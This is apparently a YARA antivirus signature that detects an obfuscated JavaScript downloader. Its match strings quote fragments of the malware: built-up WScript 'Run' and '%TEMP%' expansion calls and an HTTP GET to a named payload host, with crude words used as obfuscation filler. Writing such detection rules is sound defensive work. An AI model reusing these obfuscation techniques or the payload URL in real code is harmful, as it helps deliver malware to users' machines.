rule sig_20160428_df3805e259b6920bc7a0246b9bd2b7c0 {
  meta:
    description = "datamaliciousorder - file 20160428_df3805e259b6920bc7a0246b9bd2b7c0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "75b5b775d85c5d64db2873994e0563afcd8028c7d2e1ba7f200068ed1f664091"

  strings:
    $s1  = "function ZtpEsxUccFddAaqBmcTnz(TsnJlnZpgDuaCgnHfuHjw){WmjUnjQzbNvrHkzCqlJln[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function NmnEgdHprXwpWdbYrmOcq() {return WmjUnjQzbNvrHkzCqlJln[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function ZtpEsxUccFddAaqBmcTnz(TsnJlnZpgDuaCgnHfuHjw){WmjUnjQzbNvrHkzCqlJln[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function KiuVokPuoZecBzeVciEpp(RbhMsqBrzWufNvuJpgFtb, ScmCmlGqvDyfKtoKynEql){UhcWtqUthLlgEgkLhdAck = UhcWtqUthLlgEgkLhdAck * 1; " ascii
    $s5  = "return RbhMsqBrzWufNvuJpgFtb - ScmCmlGqvDyfKtoKynEql;};" fullword ascii
    $s6  = "HflXzuHvuQlsSzpIdjQve[JddNigBxfZajBqdItzGzc](\"G\" + \"ET\", \"http://zahariev.myjino.ru/n8sja\", false);" fullword ascii
    $s7  = "function NmnEgdHprXwpWdbYrmOcq() {return WmjUnjQzbNvrHkzCqlJln[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s8  = "function KiuVokPuoZecBzeVciEpp(RbhMsqBrzWufNvuJpgFtb, ScmCmlGqvDyfKtoKynEql){UhcWtqUthLlgEgkLhdAck = UhcWtqUthLlgEgkLhdAck * 1; " ascii
    $s9  = "var WmjUnjQzbNvrHkzCqlJln = function RveWgpCfcAvjBvsKorUse() {return KqjFpwHzcAsjFpkHarSzc[UfbPzfMrtNezBjnUtmCea](\"WScript\"+\"" ascii
    $s10 = "if (HflXzuHvuQlsSzpIdjQve[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s11 = "function XnqMloLraQssIggWuePso(){return XjwUsaQoiHujKtfRydTxb + \"\";};" fullword ascii
    $s12 = "function TnbOtnTkuVcyVqvRvmMdn() {return ((KusTwzXjePkyBfyAkqSyr == true) && (KusTwzXjePkyBfyAkqSyr == OfuZogBfxXkeIogKwvRre)) ?" ascii
    $s13 = "function TnbOtnTkuVcyVqvRvmMdn() {return ((KusTwzXjePkyBfyAkqSyr == true) && (KusTwzXjePkyBfyAkqSyr == OfuZogBfxXkeIogKwvRre)) ?" ascii
    $s14 = "var KqjFpwHzcAsjFpkHarSzc = this[\"WScript\"];" fullword ascii
    $s15 = "var WmjUnjQzbNvrHkzCqlJln = function RveWgpCfcAvjBvsKorUse() {return KqjFpwHzcAsjFpkHarSzc[UfbPzfMrtNezBjnUtmCea](\"WScript\"+\"" ascii
    $s16 = "return KiuVokPuoZecBzeVciEpp(1 == 1 ? KdvVlrNpgIriFvuFqcLuc : 0, 1 == 1 ? WswDkpDfzQsrQduOhvYfc : 0);" fullword ascii
    $s17 = "var JahOpgTkgQgoNooFbhCkr = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "function ScgWnpPfdZckPdwQvkOaa(SelXcxFhfZndOhkIhxWtb) {var FxsXvmKfzRowBtwXatNsu = (1, 2, 3, 4, 5, SelXcxFhfZndOhkIhxWtb); retur" ascii
    $s19 = "OfuZogBfxXkeIogKwvRre = true; " fullword ascii
    $s20 = "var KusTwzXjePkyBfyAkqSyr = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}